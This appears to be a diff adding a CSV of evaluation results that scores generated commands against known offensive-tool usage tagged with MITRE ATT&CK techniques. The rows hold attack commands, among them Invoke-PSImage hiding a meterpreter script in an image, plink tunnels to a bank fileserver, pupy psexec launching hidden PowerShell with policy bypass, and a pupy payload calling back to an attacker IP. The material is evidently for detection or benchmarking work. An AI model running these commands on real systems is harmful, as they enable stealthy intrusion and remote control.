@@ -1,0 +1,8 @@
+file,tool,input_command,matched_command,edit_score,match_found
+command_invoke_psimage_TA0005_T1027.txt,invoke psimage,Invoke-PSImage -Script .\upx.exe -Out .\evil-upx.png -Image .\kiwi.jpg,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,0.733,True
+command_plink_TA0011_T1071.txt,plink,plink.exe -ssh login.example.com,`plink.exe <domain_admin>@<bankfileserver_ip>`,0.436,True
+command_plink_TA0011_T1071.txt,plink,plink.exe -no-sanitise-stdout -ssh login.example.com,`plink.exe <domain_admin>@<bankfileserver_ip>`,0.367,True
+command_plink_TA0011_T1071.txt,plink,plink.exe -R <http_port>:localhost:<http_port> login.example.com,`plink.exe <domain_admin>@<bankfileserver_ip>`,0.345,True
+command_pupy_TA0003_T1546.txt,pupy,pupwinutils/psexec.py -s -i cmd /c powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File <file_path>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,0.248,True
+command_pupy_TA0003_T1546.txt,pupy,"pupwinutils/psexec.py -s -i pwsh.exe /c powershell.exe -NoProfile -WindowStyle Hidden -Command ""Start-Process -FilePath <file_path> -Verb RunAs""",`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,0.221,True
+command_pupy_TA0003_T1546.txt,pupy,rubber_ducky.ps1_oneliner,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`",0.194,True
